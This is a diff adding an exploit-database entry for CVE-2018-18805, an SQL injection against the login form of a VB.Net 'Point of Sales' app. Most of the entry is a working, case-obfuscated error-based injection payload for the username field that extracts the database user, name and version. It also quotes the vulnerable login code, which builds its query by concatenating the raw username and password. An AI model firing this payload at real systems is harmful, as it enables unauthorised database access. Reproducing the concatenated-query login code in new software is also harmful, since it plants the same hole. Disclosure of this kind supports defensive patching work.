@@ -1,0 +1,43 @@
+# Exploit Title: Point of Sales (POS) in VB.Net MySQL Database 1.0 - SQL Injection
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/poinofsales_0.zip
+# Version: 1.0
+# Category: Windows
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18805
+
+# POC: 
+# 1)
+# User: '||(SEleCT 'Efe' FRoM DuaL WheRE 113=113 AnD (SEleCT 64 FRom(SELeCT CoUNT(*),ConCAT(ConCAT(0x203a20,UsER(),DAtABAsE(),VErSIoN()),(SelEcT (ELT(64=64,1))),FLooR(RAnD(0)*2))x FrOM INFOrMATIoN_SchEMA.pLUGINS GroUP By x)a))||'
+# Pass: Null
+# 
+# https://2.bp.blogspot.com/-qlfhS-GUaCQ/W9Yt3aHdLHI/AAAAAAAAENg/Hmxj2lZ62cYITPlTNaNrwwAgh379Cbi8ACLcBGAs/s1600/sql3.png
+# 
+#[PATH]/LoginForm1.vb
+#....
+#11     Private Sub OK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OK.Click
+#12         sql = "SELECT * FROM `tblemployee` WHERE `USERNAME` ='" & UsernameTextBox.Text & "' and `PASSWRD` = sha1('" & PasswordTextBox.Text & "')"
+#13         janobefindthis(sql)
+#14 
+#15         If GetNumRows() = 1 Then
+#16             LoadSingleResult("login")
+#17             ' MsgBox(fullname)
+#18             Form1.statsloginname.Text = fullname
+#19             Form1.tsLogin.Text = "Logout"
+#20 
+#21             If usertype = "Administrator" Then
+#22                 Visible_Admin(True)
+#23             Else
+#24                 Visible_Cashier(True)
+#25             End If
+#26         Else
+#27             MsgBox("Username or Password not registered!")
+#28         End If
+#29 
+#30 
+#31         Me.Close()
+#32     End Sub
+#....
